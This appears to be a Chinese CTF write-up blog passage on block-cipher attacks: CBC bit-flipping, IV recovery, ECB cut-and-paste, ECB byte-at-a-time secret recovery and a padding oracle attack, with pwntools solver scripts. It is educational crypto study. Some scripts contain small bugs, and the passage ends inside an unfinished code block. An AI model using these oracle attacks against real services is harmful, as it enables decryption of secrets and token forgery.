<p>对于AES128的CBC解密模式，将密文按照16字节（128bits）分块，每个密文块先进行AES解密，然后再与前一个密文块（或IV）进行异或操作，得到明文块。</p>
<p>也就是可以通过伪造“0”（0x30）对应的密文块，从而使得解密后的明文块中的“0”变为“1”（0x31）。</p>
<p>$$P_1(i) &#x3D; Decrypt(C_1(i)) \oplus C_0(i)\ 需要将C_0(i)修改为C_0^<code>(i)=C_0(i) \oplus \Delta\\ 则P_1^</code>(i)&#x3D;Decrypt(C_1(i)) \oplus C_0^<code>(i)=Decrypt(C_1(i)) \oplus C_0(i) \oplus \Delta=P_1(i)\oplus \Delta\\ 则\Delta=P_1(i) \oplus P_1^</code>(i)\ 则C_0^<code>(i)=C_0(i) \oplus \Delta=C_0(i)\oplus P_1(i)\oplus P_1^</code>(i)$$</p>
<p>也就是说，只需计算C_0^&#96;(i)&#x3D;0xe1⊕0x30⊕0x31&#x3D;0xe0即可，也就是不进位模二加。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session=6b1f33a7          552ebbeb9276a8cd9f741b7d29f8c9e1</span><br><span class="line">8c5b9c17;admin=0          eb455757207ac420659e7eab56ddee25</span><br><span class="line">session=6b1f33a78c5b9c17;admin=0;checksum=552ebbeb9276a8cd9f741b7d29f8c9e0eb455757207ac420659e7eab56ddee25</span><br></pre></td></tr></table></figure>

<h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 2</span></span><br><span class="line">[+] sha256(iv)=11f595abc9d7b986d24fce986d1f9ddfb0d83f2f978db20b862ea730e570bff0</span><br><span class="line">[+] 1. server&#x27;s job: print aes_cbc_dec(key,iv,your_input_c).encode(&#x27;hex&#x27;)</span><br><span class="line">[+] 2. your job: guess iv</span><br><span class="line">[-] your choice:（待输入）</span><br></pre></td></tr></table></figure>

<p>令输入的密文为c0、c1，输出的明文为m0、m1。</p>
<p>$$dec(c_0)&#x3D;m_0 \oplus IV\ dec(c_1)&#x3D;m_1 \oplus c_0\ 若c_0&#x3D;c_1,则m_0 \oplus IV&#x3D;m_1 \oplus c_0,\ 则IV&#x3D;m_0 \oplus m_1 \oplus c_0$$</p>
<p>那么输入两次相同的16字节字符串，将这个字符串异或两次解密出的明文，即为IV。</p>
<h2 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 3</span></span><br><span class="line">[+] cookie=session:0884ce7c;timedl=1;admin=0;guess_cookie_ma=1;guess_mp_ab=1;guess_cookie_mb=0;hell_pad=233</span><br><span class="line">[+] 128bit_ecb_encrypt(cookie):0632b3e7adb2f6d5ae4a92f553f2f4a4c9f95b099cfd8e3408137d134eb51d147045f278246a831fabdbdccde099b4b694b07e699ffae6a82c6cfbc4454816b1c78e5d1be8b67e235fbbfd2a75e73f32bac806808bc2e102db8f2c159b250415</span><br><span class="line">[+] only admin can see the flag</span><br><span class="line">[-] input your encrypted cookie(encode hex):（待输入）</span><br></pre></td></tr></table></figure>

<p><img src="/1763435936651-3.png" alt="img"></p>
<p>先将明密文分块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session:0884ce7c          0632b3e7adb2f6d5ae4a92f553f2f4a4</span><br><span class="line">;timedl=1;admin=          c9f95b099cfd8e3408137d134eb51d14</span><br><span class="line">0;guess_cookie_m          7045f278246a831fabdbdccde099b4b6</span><br><span class="line">a=1;guess_mp_ab=          94b07e699ffae6a82c6cfbc4454816b1</span><br><span class="line">1;guess_cookie_m          c78e5d1be8b67e235fbbfd2a75e73f32</span><br><span class="line">b=0;hell_pad=233          bac806808bc2e102db8f2c159b250415</span><br></pre></td></tr></table></figure>

<p>发现第三行和第五行只有第一个字符不一样，且正好是需要的字符“1”，因此把第五行的密文覆盖掉第三行的密文即可。</p>
<h2 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 4</span></span><br><span class="line">[+] sha256(secret)=d014cbddd2cbb0fa2404c519c166bc85c03ee3445d643f451a5f5d6244e7e34d</span><br><span class="line">[+] assert len(secret)==16</span><br><span class="line">[+] 1. server&#x27;s job: print aes_ecb(key,input+secret+&#x27;\x00&#x27;*((16-(len(input+secret) % 16)) % 16))</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:（待输入）</span><br></pre></td></tr></table></figure>

<p>由于ECB模式是分块加密，每块16字节，第一次先输入15字节”1“，会自动拼接1字节secret[0]，然后从0x0-0xff爆破这一字节，直至对应的密文块相同。第二次输入14字节”1“+secret[0]，会自动拼接1字节secret[1]，再次爆破。以此类推，直至爆破出全部secret。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;x.x.x.x&quot;</span>, <span class="number">1111</span>)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">    padding = <span class="string">b&#x27;1&#x27;</span> * (<span class="number">16</span>-i)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;input(encode hex):&quot;</span>,padding.<span class="built_in">hex</span>().encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;before encrypted:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.recvline)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;encrypted msg: &quot;</span>)</span><br><span class="line">    cypher = p.recvline.decode().strip()[:<span class="number">32</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;cipher: <span class="subst">&#123;cipher&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        test_padding = padding + secret + <span class="built_in">bytes</span>([j])</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;input(encode hex):&quot;</span>, (test_padding.<span class="built_in">hex</span>().encode()))</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;encrypted msg: &quot;</span>)</span><br><span class="line">        test_cypher = p.recvline.decode().strip()[:<span class="number">32</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;test_cypher: <span class="subst">&#123;test_cypher&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cypher == test_cypher:</span><br><span class="line">            secret += <span class="built_in">bytes</span>([j])</span><br><span class="line">    <span class="built_in">print</span>(secret)</span><br></pre></td></tr></table></figure>

<h2 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 5</span></span><br><span class="line">[+] sha256(secret)=4c766c8749526dd1a14fdf37619d2fbebbbc2478e25e27e63e591ae0aafb305d</span><br><span class="line">[+] assert len(secret)==16</span><br><span class="line">[+] myblockencrypt_ecb(secret).encode(&quot;hex&quot;)=4c21cc2bc7941b224ed45bd02ee11b60</span><br><span class="line">[+] In this challenge, you need to try something.</span><br><span class="line">[+] 1. server&#x27;s job: print myblockencrypt_ecb(your_input)</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:（待输入）</span><br></pre></td></tr></table></figure>

<p>尝试一些输入，直接拿writeup的例子说明。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] In this challenge, you need to try something.</span><br><span class="line">[+] 1. server&#x27;s job: print myblockencrypt_ecb(your_input)</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:1</span><br><span class="line">[-] input(encode hex):80808080808080808080808080808080</span><br><span class="line">[+] myblockencrypt_ecb(your_input).encode(&quot;hex&quot;):35093509350935093509350935093509</span><br><span class="line">[+] 1. server&#x27;s job: print myblockencrypt_ecb(your_input)</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:1</span><br><span class="line">[-] input(encode hex):66666666666666666666666666666666</span><br><span class="line">[+] myblockencrypt_ecb(your_input).encode(&quot;hex&quot;):022c022c022c022c022c022c022c022c</span><br></pre></td></tr></table></figure>

<p>加密实际上就是对每2byte进行置换，也就是分组长度位2byte的加密，实际上就是每16位一段进行加密且互不影响。列一个置换表出来，即可找到secret。数次访问的加密结果完全相同，可以认为这个加密是个固定的映射，因此尝试从0000到ffff的所有输入，然后去对密文就可以了。</p>
<h2 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h2><blockquote>
<p>padding oracle attack猜解IV</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 6</span></span><br><span class="line">[+] padding(m):m+chr(16-(len(m)%16))*(16-(len(m)%16))</span><br><span class="line">[+] unpadding(m):m[:-ord(m[-1])]</span><br><span class="line">[+] len(secret):16</span><br><span class="line">[+] iv+aes128_cbc(key,iv,padding(secret)):31313131313131313131313131313131891f3925b171f363bfc1ab0f4c03c9172cdfbd56dbd225d2accaf2b6fcbd0780</span><br><span class="line">[+] 1. server&#x27;s job: decrypt and unpadding</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:（待输入）</span><br><span class="line"></span><br><span class="line">31313131313131313131313131313131 # IV，即ASCII &#x27;1&#x27;的重复</span><br><span class="line">891f3925b171f363bfc1ab0f4c03c917 # 第一组密文</span><br><span class="line">2cdfbd56dbd225d2accaf2b6fcbd0780 # 第二组密文</span><br></pre></td></tr></table></figure>

<p>首先详细了解CBC模式的加解密过程</p>
<p><img src="/1763435936651-4.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="number">1</span>. 明文经过填充后，分为不同的组block，以组的方式对数据进行处理 </span><br><span class="line"><span class="number">2</span>. 初始化向量（IV）首先和第一组明文进行XOR（异或）操作，得到”中间值“</span><br><span class="line"><span class="number">3</span>. 采用密钥对中间值进行块加密，删除第一组加密的密文 （加密过程涉及复杂的变换、移位等） </span><br><span class="line"><span class="number">4</span>. 第一组加密的密文作为第二组的初始向量（IV），参与第二组明文的异或操作  </span><br><span class="line"><span class="number">5</span>. 依次执行块加密，最后将每一块的密文拼接成密文  </span><br></pre></td></tr></table></figure>

<p><img src="/1763435936652-5.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解密</span></span><br><span class="line">1. 会将密文进行分组（按照加密采用的分组大小），前面的第一组是初始化向量，从第二组开始才是真正的密文</span><br><span class="line">2. 使用加密密钥对密文的第一组进行解密，得到”中间值“  </span><br><span class="line">3. 将中间值和初始化向量进行异或，得到该组的明文</span><br><span class="line">4. 前一块密文是后一块密文的IV，通过异或中间值，得到明文</span><br><span class="line">5. 块全部解密完成后，拼接得到明文，密码算法校验明文的格式（填充格式是否正确）</span><br><span class="line">6. 校验通过得到明文，校验失败得到密文 </span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Padding Oracle 攻击的条件：</strong><ul>
<li><p>1、攻击者能够获得密文（ciphertext），以及密文对应的IV（初始化向量）</p>
</li>
<li><p>2、攻击者能够触发密文的解密过程，且能够知道密文的解密结果（因为需要根据结果不断尝试）。</p>
</li>
</ul>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/833582b2f560">Padding Oracle Attack(填充提示攻击)详解及验证 - 简书</a></p>
<p>通过上面的例题，详细了解一下padding oracle attack的原理，再针对上面的例题，从已知明文的角度详细了解一下加解密的过程。</p>
<p><img src="/1763435936652-6.png" alt="img"></p>
<p><img src="/1763435936652-7.png" alt="img"></p>
<p>例题密文如下，对其进行分组</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7B216A634951170F  # IV</span><br><span class="line">F851D6CC68FC9537  # 第一组密文c1</span><br><span class="line">858795A28ED4AAC6  # 第二组密文c2</span><br></pre></td></tr></table></figure>

<p>那么可以首先通过构造初始向量IV破解第一组密文。</p>
<p>将IV设置为全0，向服务器提交IV+c1，即00000000000000000F851D6CC68FC9537。</p>
<p><img src="/1763435936652-8.png" alt="img"></p>
<p>首先假设明文从c1填充了最后一字节，那么按照填充规则，最后一字节明文应当是填充0x01。</p>
<p>那么此时全0 IV一定会解密失败，解密的过程是先解密密文得到一个中间值，然后将中间值和IV异或得到明文，而此时解密出的明文不满足填充规则，也就是不是0x01。</p>
<p>依次将IV最后一个字节从0x01~0xFF递增，直到解密的明文最后一个字节为0x01时，才是正确的padding，而此时IV为0000000000000003C，此时将0000000000000003C+c1提交给服务器，将会返回解密正确的提示，如下图。</p>
<p><img src="/1763435936652-9.png" alt="img"></p>
<p>此时已知IV的最后一个字节为0x3C，最后一个填充字节为0x01，那么即可得到c1解密过程中的中间值的最后一个字节是0x01^0x3C &#x3D; 0x3D。</p>
<p>接着利用同样的方法，假设c1填充了最后两字节，那么填充的内容应当是0x02 0x02。而此时已经知道了中间值的最后一字节是0x3D，那么可以得到IV的最后一字节应该是0x3D^0x02 &#x3D; 0x3F，那么将IV&#x3D;000000000000003F，此时开始从0x00~0xFF遍历IV的倒数第2个字节，直到返回解密成功，如下图</p>
<p><img src="/1763435936652-10.png" alt="img"></p>
<p>那么此时猜解出了中间值的倒数第二个字节是0x02^0x24 &#x3D; 0x26。以此类推，一直假设至填充8字节0x08，即可完成中间值猜解，如下图。</p>
<p><img src="/1763435936652-11.png" alt="img"></p>
<p>当中间值全部猜解完毕后，将中间值和题目给的IV异或，即可得到c1的明文。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x39</span> <span class="number">0x73</span> <span class="number">0x23</span> <span class="number">0x22</span> <span class="number">0x07</span> <span class="number">0x6A</span> <span class="number">0x26</span> <span class="number">0x3D</span>  <span class="comment"># c1中间值</span></span><br><span class="line"><span class="keyword">xor</span> </span><br><span class="line"><span class="number">0x7B</span> <span class="number">0x21</span> <span class="number">0x6A</span> <span class="number">0x63</span> <span class="number">0x49</span> <span class="number">0x51</span> <span class="number">0x17</span> <span class="number">0x0F</span>  <span class="comment"># 初始IV</span></span><br><span class="line">= </span><br><span class="line">BRIAN;<span class="number">12</span>  <span class="comment"># 明文m1</span></span><br></pre></td></tr></table></figure>

<p><strong>重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当前解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值得最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值。</strong></p>
<p>继续破解第二组密文，第二组密文的IV向量是第一组密文，随意按照上述的逻辑构造第一组密文，即可破解出第二组明文。也就是从00000000000000000858795A28ED4AAC6开始遍历，直至找到中间值，即可求出明文m2。</p>
<p>再回到本题，本题解密并不返回结果，只返回能不能成功解密，iv可控，因此也是要利用padding oracle attack填充提示攻击。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">31313131313131313131313131313131 # IV，即ASCII &#x27;1&#x27;的重复</span><br><span class="line">891f3925b171f363bfc1ab0f4c03c917 # 第一组密文c1</span><br><span class="line">2cdfbd56dbd225d2accaf2b6fcbd0780 # 第二组密文c2</span><br><span class="line">dec(c1) = iv ^ m1</span><br><span class="line">dec(c2) = c1 ^ m2</span><br><span class="line">iv = 1111111111111111</span><br><span class="line">c1、c2已知</span><br><span class="line">m2 = &#x27;\x10&#x27;*16</span><br></pre></td></tr></table></figure>

<p>要求m1，就必须使用唯一与其相关的c1；利用填充规则，就必须将c1置于最后一段。尝试以下的解密输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一段：&#x27;\x00&#x27; * 15 + ?</span><br><span class="line">第二段：c1</span><br></pre></td></tr></table></figure>

<p>对于?取值0~255依次进行测试。根据CBC解密流程，如果当?&#x3D;a时能够解密成功，说明此时解密的第一段明文最后一字节为\x01，即m1的末位为 a ^ iv ^ 0x01，a即为不变的中间值的最后一位。</p>
<p>接着用a ^ 0x01 ^ 0x02来代替a作为固定末位，此时解密的最后一位固定为\x02。继续调整输入第一段的倒数第二位，使得解密结果末尾为\x02\x02，此时解密成功，可求出m1的倒数第二位。以此类推可以求出m1。再把c1作为c2的IV，按照同样的方法求得m2。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chal6</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;[-] your choice:&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;[+] iv+aes128_cbc(key,iv,padding(secret)):&quot;</span>)</span><br><span class="line">    msg = unhexlify(io.recvline().strip())</span><br><span class="line">    iv, cipher = msg[:<span class="number">16</span>], msg[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    暴力破解第一段密文</span></span><br><span class="line"><span class="string">    secret = b&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(16):</span></span><br><span class="line"><span class="string">        for j in tqdm(range(0x100)):</span></span><br><span class="line"><span class="string">            ct = iv[:15-i] + bytes([j]) + iv[16-i:] + cipher</span></span><br><span class="line"><span class="string">            if chal6_dec(ct) == True:</span></span><br><span class="line"><span class="string">                secret = bytes([iv[-i - 1] ^ j ^ (i + 1)]) + secret</span></span><br><span class="line"><span class="string">                iv = iv[:15-i] + xor(ct[15-i:16], bytes([(i + 1) ^ (i + 2)]) * (i + 1))</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">        print(secret)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    secret = <span class="string">b&#x27;\xe6?\xee\x07\xa3\x07\xaa\xc8\x8em\xb5\xa0\x90&#x27;</span></span><br><span class="line">    iv = iv[:<span class="number">16</span>-<span class="built_in">len</span>(secret)] + xor(iv[<span class="number">16</span>-<span class="built_in">len</span>(secret):], xor(secret, <span class="built_in">bytes</span>([<span class="built_in">len</span>(secret) + <span class="number">1</span>]) * <span class="built_in">len</span>(secret)))</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(secret), <span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0x100</span>)):</span><br><span class="line">            ct = iv[:<span class="number">15</span>-i] + <span class="built_in">bytes</span>([j]) + iv[<span class="number">16</span>-i:] + cipher</span><br><span class="line">            <span class="keyword">if</span> chal6_dec(ct) == <span class="literal">True</span>:</span><br><span class="line">                secret = <span class="built_in">bytes</span>([iv[-i - <span class="number">1</span>] ^ j ^ (i + <span class="number">1</span>)]) + secret</span><br><span class="line">                iv = iv[:<span class="number">15</span>-i] + xor(ct[<span class="number">15</span>-i:<span class="number">16</span>], <span class="built_in">bytes</span>([(i + <span class="number">1</span>) ^ (i + <span class="number">2</span>)]) * (i + <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(secret)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;[-] your choice:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;[-] secret(encode hex):&quot;</span>, hexlify(secret))</span><br></pre></td></tr></table></figure>

<h1 id="fault"><a href="#fault" class="headerlink" title="fault"></a>fault</h1><blockquote>
<p>国密SM4</p>
<p><a target="_blank" rel="noopener" href="https://blog.soreatu.com/posts/case-study-differetial-cryptanalysis-attack/#%E5%BC%BA%E7%BD%91%E6%9D%AF2020-fault">Case Study: Differetial Cryptanalysis Attack | Soreat_u’s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://su-team.cn/posts/48139.html#modestudy">强网杯 S4 SU Write-Up - su-team</a></p>
</blockquote>
<h1 id="flagsystem"><a href="#flagsystem" class="headerlink" title="flagsystem"></a>flagsystem</h1><p>首先获得原始令牌，注册得到(signature, data)</p>
<p>由于seed是利用time.time()时间戳生成，可±10秒进行爆破，获取正确的seed后，可获取初始的random_constants和random_iv。</p>
<p>爆破sha256的前缀破解pow。</p>
<p>构造恶意数据，在原始数据后添加新的权限字段0xFF，也就是创建权限为0xFF的数据。</p>
<p>li用爆破出的seed计算而已数据的哈希</p>
<p>利用给出的N和e，以及给出的签名消sign也就是密文c，已知N、e、c可以通过一系列方法求p、q、d。</p>
<p>然后直接用d对哈希进行签名，获取权限为0xFF的令牌。</p>
<p><strong>没找到wp，先放放。</strong></p>
<h1 id="hitcon-ctf2025-Sharing-is-caring"><a href="#hitcon-ctf2025-Sharing-is-caring" class="headerlink" title="hitcon ctf2025_Sharing is caring"></a>hitcon ctf2025_Sharing is caring</h1><blockquote>
<p>李博士打hitcon ctf2025时有一道re题，解开后是一道密码题</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span 